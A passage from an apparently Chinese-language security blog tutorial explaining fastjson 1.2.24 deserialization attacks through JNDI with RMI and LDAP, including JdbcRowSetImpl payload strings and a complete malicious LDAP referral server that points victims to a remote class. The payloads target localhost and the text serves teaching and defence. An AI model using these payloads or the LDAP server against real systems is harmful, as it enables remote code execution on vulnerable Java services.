	at javax.naming.spi.NamingManager.getObjectFactoryFromReference(NamingManager.java:163)
	at javax.naming.spi.NamingManager.getObjectInstance(NamingManager.java:319)
	at com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:464)
	... 4 more
</code></pre><p>我们点击进入异常堆栈提示的代码 <code>at javax.naming.spi.NamingManager.getObjectFactoryFromReference(NamingManager.java:163)</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>static</span> ObjectFactory <span style=color:#a6e22e>getObjectFactoryFromReference</span>(
</span></span><span style=display:flex><span>        Reference ref, String factoryName)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>throws</span> IllegalAccessException,
</span></span><span style=display:flex><span>        InstantiationException,
</span></span><span style=display:flex><span>        MalformedURLException {
</span></span><span style=display:flex><span>        Class<span style=color:#f92672>&lt;?&gt;</span> clas <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// Try to use current class loader</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>             clas <span style=color:#f92672>=</span> helper.<span style=color:#a6e22e>loadClass</span>(factoryName);
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>catch</span> (ClassNotFoundException e) {
</span></span><span style=display:flex><span>            <span style=color:#75715e>// ignore and continue</span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>// e.printStackTrace();</span>
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#75715e>// All other exceptions are passed up.</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// Not in class path; try to use codebase</span>
</span></span><span style=display:flex><span>        String codebase;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (clas <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span> <span style=color:#f92672>&amp;&amp;</span>
</span></span><span style=display:flex><span>                (codebase <span style=color:#f92672>=</span> ref.<span style=color:#a6e22e>getFactoryClassLocation</span>()) <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span>) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>                clas <span style=color:#f92672>=</span> helper.<span style=color:#a6e22e>loadClass</span>(factoryName, codebase);
</span></span><span style=display:flex><span>            } <span style=color:#66d9ef>catch</span> (ClassNotFoundException e) {
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> (clas <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span>) <span style=color:#f92672>?</span> (ObjectFactory) clas.<span style=color:#a6e22e>newInstance</span>() : <span style=color:#66d9ef>null</span>;
</span></span><span style=display:flex><span>    }
</span></span></code></pre></div><p>可以看到在加载类成功后使用反射创建了这个类，并且进行了强制转换，而我们定义的这个类和<code>javax.naming.spi.ObjectFactory</code>没有任何关系，在强转时必然异常，但这并不影响我们添加的代码已经执行了。</p><p>JNDI和RMI的调用流程大致是：JNDI 在请求到 RMI 之后，RMI 返回了 Exploit 的 http 地址，JNDI 则通过网络获取到了这个类文件，通过类加载器将其加载到了JVM中并且实例化了这个类，而 Exploit 的静态代码块内是打开计算器的代码，实例化时就会执行这段代码。</p><p><img src=https://oss.typesafe.cn/jndi-rmi.png alt=https://oss.typesafe.cn/jndi-rmi.png></p><h2 id=fastjson-的-rmijndi-利用漏洞>Fastjson 的 RMI/JNDI 利用漏洞</h2><p>在上一节中我们有讲到利用 fastjson 的 AutoType 功能，可以指定反序列化的类。安全人员利用 <code>com.sun.rowset.JdbcRowSetImpl</code> 的 JNDI 功能刚好能够触发上面介绍的那个流程。</p><p><code>com.sun.rowset.JdbcRowSetImpl</code> 有两个重要属性</p><ul><li><strong>dataSourceName</strong> 数据源名称</li><li><strong>autoCommit</strong> 触发JNDI请求的关键参数</li></ul><p><code>dataSourceName</code> 的 set 方法可以忽略，就是一个正常的参数赋值。</p><p><code>autoCommit</code> 的 set 方法如下：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>setAutoCommit</span>(<span style=color:#66d9ef>boolean</span> var1) <span style=color:#66d9ef>throws</span> SQLException {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>conn</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span>) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>conn</span>.<span style=color:#a6e22e>setAutoCommit</span>(var1);
</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>conn</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>connect</span>();
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>conn</span>.<span style=color:#a6e22e>setAutoCommit</span>(var1);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p><code>com.sun.rowset.JdbcRowSetImpl</code> 在反序列化后 <code>conn</code> 参数必然为空，会进入 <code>this.connect()</code> 方法，代码如下。</p><pre tabindex=0><code>private Connection connect() throws SQLException {
    if (this.conn != null) {
        return this.conn;
    } else if (this.getDataSourceName() != null) {
        try {
            InitialContext var1 = new InitialContext();
            DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());
            return this.getUsername() != null &amp;&amp; !this.getUsername().equals(&#34;&#34;) ? var2.getConnection(this.getUsername(), this.getPassword()) : var2.getConnection();
        } catch (NamingException var3) {
            throw new SQLException(this.resBundle.handleGetObject(&#34;jdbcrowsetimpl.connect&#34;).toString());
        }
    } else {
        return this.getUrl() != null ? DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()) : null;
    }
}
</code></pre><p>刚说了 <code>conn</code> 参数必然为空，因此就会执行 <code>if</code> 的第二个分支，进行了 JNDI 请求。</p><p>因此构造一个 POC 也就十分简单了。</p><pre tabindex=0><code>import com.alibaba.fastjson.JSON;

public class Eval3 {

    public static void main(String[] args) throws Exception {
        String payload = &#34;{\&#34;@type\&#34;:\&#34;com.sun.rowset.JdbcRowSetImpl\&#34;,\&#34;dataSourceName\&#34;:\&#34;rmi://localhost:1099/Exploit\&#34;,\&#34;autoCommit\&#34;:true}&#34;;
        JSON.parse(payload);
    }
}
</code></pre><p>启动了 <code>RMIServer</code> 和 <code>WebServer</code> 后执行这段代码即可完成漏洞利用。</p><h2 id=ldap--jndi>LDAP + JNDI</h2><p>2017年 Oracle 发布了新版 JDK 默认禁用了通过存储在命名和目录服务中的 JNDI 对象工厂进行远程类加载。要通过 RMI Registry 或 COS Naming 服务提供者启用远程类加载，请根据需要将以下系统属性设置为字符串“true”：</p><pre tabindex=0><code>com.sun.jndi.rmi.object.trustURLCodebase
com.sun.jndi.cosnaming.object.trustURLCodebase
</code></pre><p>详细的版本信息如下：</p><table><thead><tr><th>JRE 家庭版</th><th>JRE 安全基线（完整字符串）</th></tr></thead><tbody><tr><td>8</td><td>1.8.0_121-b13</td></tr><tr><td>7</td><td>1.7.0_131-b12</td></tr><tr><td>6</td><td>1.6.0_141-b12</td></tr></tbody></table><p>来源：https://www.oracle.com/java/technologies/javase/7u131-relnotes.html</p><p>因此安全人员又挖掘到了基于 LDAP + JNDI 的利用方式，流程和 RMI + JNDI 基本相同。</p><p>首先是创建一个 LDAP 服务，我们这里使用到了 <code>unboundid-ldapsdk</code> 这个库。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.unboundid.ldap.sdk.Entry;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.unboundid.ldap.sdk.LDAPException;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.unboundid.ldap.sdk.LDAPResult;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.unboundid.ldap.sdk.ResultCode;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javax.net.ServerSocketFactory;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javax.net.SocketFactory;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javax.net.ssl.SSLSocketFactory;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.net.InetAddress;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.text.MessageFormat;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>LDAPServer</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>final</span> String javaCodeBase <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;http://127.0.0.1:80/&#34;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>final</span> String javaClassName <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Exploit&#34;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) <span style=color:#66d9ef>throws</span> Exception {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>int</span> port <span style=color:#f92672>=</span> 1389;
</span></span><span style=display:flex><span>        InMemoryDirectoryServerConfig config <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> InMemoryDirectoryServerConfig(<span style=color:#e6db74>&#34;dc=example,dc=com&#34;</span>);
</span></span><span style=display:flex><span>        config.<span style=color:#a6e22e>setListenerConfigs</span>(<span style=color:#66d9ef>new</span> InMemoryListenerConfig(
</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#34;listen&#34;</span>,
</span></span><span style=display:flex><span>                InetAddress.<span style=color:#a6e22e>getByName</span>(<span style=color:#e6db74>&#34;0.0.0.0&#34;</span>),
</span></span><span style=display:flex><span>                port,
</span></span><span style=display:flex><span>                ServerSocketFactory.<span style=color:#a6e22e>getDefault</span>(),
</span></span><span style=display:flex><span>                SocketFactory.<span style=color:#a6e22e>getDefault</span>(),
</span></span><span style=display:flex><span>                (SSLSocketFactory) SSLSocketFactory.<span style=color:#a6e22e>getDefault</span>()));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        config.<span style=color:#a6e22e>addInMemoryOperationInterceptor</span>(<span style=color:#66d9ef>new</span> EvalInMemoryOperationInterceptor());
</span></span><span style=display:flex><span>        InMemoryDirectoryServer ds <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> InMemoryDirectoryServer(config);
</span></span><span style=display:flex><span>        System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;Listening on 0.0.0.0:&#34;</span> <span style=color:#f92672>+</span> port);
</span></span><span style=display:flex><span>        ds.<span style=color:#a6e22e>startListening</span>();
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>EvalInMemoryOperationInterceptor</span> <span style=color:#66d9ef>extends</span> InMemoryOperationInterceptor {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>@Override</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>processSearchResult</span>(InMemoryInterceptedSearchResult result) {
</span></span><span style=display:flex><span>            String baseDN <span style=color:#f92672>=</span> result.<span style=color:#a6e22e>getRequest</span>().<span style=color:#a6e22e>getBaseDN</span>();
</span></span><span style=display:flex><span>            Entry e <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Entry(baseDN);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            e.<span style=color:#a6e22e>addAttribute</span>(<span style=color:#e6db74>&#34;javaClassName&#34;</span>, javaClassName);
</span></span><span style=display:flex><span>            e.<span style=color:#a6e22e>addAttribute</span>(<span style=color:#e6db74>&#34;javaFactory&#34;</span>, javaClassName);
</span></span><span style=display:flex><span>            e.<span style=color:#a6e22e>addAttribute</span>(<span style=color:#e6db74>&#34;javaCodeBase&#34;</span>, javaCodeBase);
</span></span><span style=display:flex><span>            e.<span style=color:#a6e22e>addAttribute</span>(<span style=color:#e6db74>&#34;objectClass&#34;</span>, <span style=color:#e6db74>&#34;javaNamingReference&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(MessageFormat.<span style=color:#a6e22e>format</span>(<span style=color:#e6db74>&#34;Send LDAP reference result for {0} redirecting to {1}{2}.class&#34;</span>, baseDN, javaCodeBase, javaClassName));
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>                result.<span style=color:#a6e22e>sendSearchEntry</span>(e);
</span></span><span style=display:flex><span>            } <span style=color:#66d9ef>catch</span> (LDAPException ex) {
</span></span><span style=display:flex><span>                ex.<span style=color:#a6e22e>printStackTrace</span>();
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>            result.<span style=color:#a6e22e>setResult</span>(<span style=color:#66d9ef>new</span> LDAPResult(0, ResultCode.<span style=color:#a6e22e>SUCCESS</span>));
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Http 服务保持不变</p><p>测试代码修改为</p><pre tabindex=0><code>import com.alibaba.fastjson.JSON;

public class Eval4 {

    public static void main(String[] args) throws Exception {
        String payload = &#34;{\&#34;@type\&#34;:\&#34;com.sun.rowset.JdbcRowSetImpl\&#34;,\&#34;dataSourceName\&#34;:\&#34;ldap://127.0.0.1:1389/Exploit\&#34;, \&#34;autoCommit\&#34;:true}&#34;;
        JSON.parse(payload);
    }
}
</code></pre><p>只需要修改 <code>dataSourceName</code> 的地址。</p><p>启动 LDAP 服务和 Http 服务后，执行测试代码也可以完成利用。</p><p>但好景不长，Oracle 官方在 Java SE：6u201、7u191、8u182 也修复了这个问题。</p><h2 id=注>注</h2><p>文中测试使用系统和工具版本如下：</p><ul><li><strong>操作系统</strong> windows 10 20H2</li><li><strong>jdk</strong> java 1.8.0_41-b04</li><li><strong>fastjson</strong> 1.2.24</li><li><strong>javassist</strong> 3.28.0-GA</li><li><strong>unboundid-ldapsdk</strong> 6.0.2</li><li><strong>代码仓库</strong> <a href=https://github.com/dushixiang/java-serialization-vulnerability>https://github.com/dushixiang/java-serialization-vulnerability</a></li></ul><h2 id=其他>其他</h2><p>挖掘漏洞是一个你来我往的过程，一个漏洞出现之后必然会伴随着后续版本的修复，除了那种已经不再更新的类库，因此在选择框架或类库时完善度和活跃度都是重要的度量标准。</p><p>fastjson 在后续的版本中也很快修复了这些漏洞，但安全人员又不断挖掘新的利用方式，在下一篇我们也会介绍在 fastjson 几个重要版本的更新内容和新的利用方式，以及在高版本的JDK中如何利用。</p></article></div></main></body></html>